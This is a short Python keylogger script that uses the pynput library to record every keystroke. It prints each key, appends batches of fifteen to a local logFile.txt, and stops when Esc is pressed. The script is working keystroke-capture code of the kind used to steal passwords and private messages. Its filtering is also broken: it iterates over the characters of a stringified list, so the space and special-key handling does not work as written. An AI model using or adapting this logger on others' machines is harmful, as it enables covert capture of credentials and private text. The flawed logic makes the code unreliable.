import pynput

from pynput.keyboard import Key, Listener


count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    # print("{} pressed".format(key))
    print(f"{key}")

    if count >= 15:
        count = 0
        write_file(str(keys))
        keys = []


def write_file(keys):
    with open("logFile.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            
            if k.find("space") > 0:
                f.write("\n")
            if k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    